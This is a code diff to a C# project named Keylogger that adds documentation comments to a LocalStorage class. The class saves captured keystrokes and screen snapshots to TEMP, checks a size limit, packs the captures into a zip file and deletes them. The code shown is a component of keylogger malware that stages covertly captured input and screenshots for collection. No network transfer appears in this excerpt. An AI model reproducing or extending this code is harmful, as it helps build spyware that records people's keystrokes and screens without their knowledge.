@@ -11,6 +11,9 @@ using System.Windows.Input;
 
 namespace Keylogger
 {
+    /// <summary>
+    /// This class manages gathered data on local computer
+    /// </summary>
     public class LocalStorage
     {
         private int MaxSizeMB;
@@ -20,6 +23,10 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// Create instance of this class (what a surprise)
+        /// </summary>
+        /// <param name="maxSizeMB">Max size in MB for this storage. After reaching this limit, local storage will be considered as full.</param>
         public LocalStorage(int maxSizeMB)
         {
             MaxSizeMB = maxSizeMB;
@@ -33,15 +40,28 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// Saves given keys into file in TEMP
+        /// </summary>
+        /// <param name="keys">List of keys to store</param>
         public void SaveKeys(IEnumerable<Key> keys)
         {
             File.AppendAllLines(KeysFile, keys.Select(x => x.ToString()));
         }
+
+        /// <summary>
+        /// Saves given bitmap (image) as a PNG file in TEMP
+        /// </summary>
+        /// <param name="bitmap">Image to save</param>
         public void SaveScreenSnapshot(Bitmap bitmap)
         {
             bitmap.Save(NextImageFile(), ImageFormat.Png);
         }
 
+        /// <summary>
+        /// Determines whether storage is full. Threshold is passed into constructor.
+        /// </summary>
+        /// <returns>True if local storage is full</returns>
         public bool IsFull()
         {
             // Calculate directory size
@@ -51,6 +71,10 @@ namespace Keylogger
             return sizeMB > MaxSizeMB;
         }
 
+        /// <summary>
+        /// Packs file with captured keys and screen snapshots into a zip file.
+        /// </summary>
+        /// <returns>Path to the zip file</returns>
         public string PackToZip()
         {
             // Prepare place for ZIP
@@ -64,6 +88,9 @@ namespace Keylogger
             return zipFile;
         }
 
+        /// <summary>
+        /// Deletes captured keys and screen snapshots
+        /// </summary>
         public void Clear()
         {
             foreach (string file in Directory.GetFiles(BaseDirectory))
@@ -72,6 +99,10 @@ namespace Keylogger
 
 
 
+        /// <summary>
+        /// Creates unique name for screenshot file
+        /// </summary>
+        /// <returns>Unique name for screenshot file</returns>
         private string NextImageFile()
         {
             int currentVersion = 1;
